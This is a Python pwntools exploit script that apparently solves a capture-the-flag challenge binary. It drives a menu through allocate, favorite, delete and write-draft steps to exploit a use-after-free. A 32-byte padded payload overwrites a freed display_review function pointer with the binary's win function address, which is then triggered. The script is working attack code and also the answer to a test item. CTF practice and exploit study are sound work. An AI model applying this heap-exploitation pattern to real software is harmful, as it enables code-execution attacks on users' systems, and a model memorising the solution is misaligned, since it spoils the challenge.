from pwn import *

def start(argv=[], *a, **kw):
        if args.GDB: # Set GDBscript
                return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
        elif args.REMOTE: # ('server', 'port')
                return remote(sys.argv[1], sys.argv[2], *a, **kw)
        else: # run locally
                return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

exe = "./chall"
elf = context.binary = ELF(exe, checksec=False)
# context.log_level = "debug"

io = start()
#io = remote("baby-pwn-4ba386d44fd0.inst14.ctf.fortid.com", 1337, ssl=True)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

#Malloc test
io.sendline("1")
io.sendline("test")

#Mark favorite test
io.sendline("2")

#Delete test
io.sendline("3")

#Write draft test overwriting display_review pointer to win function
offset = 32
payload = flat([
        "A" * offset,
        elf.sym['win'] 
])

io.sendline("4")
io.sendline(str(len(payload)))
io.sendline(payload)

#Trigger display review to call win
io.sendline("5")

io.interactive()
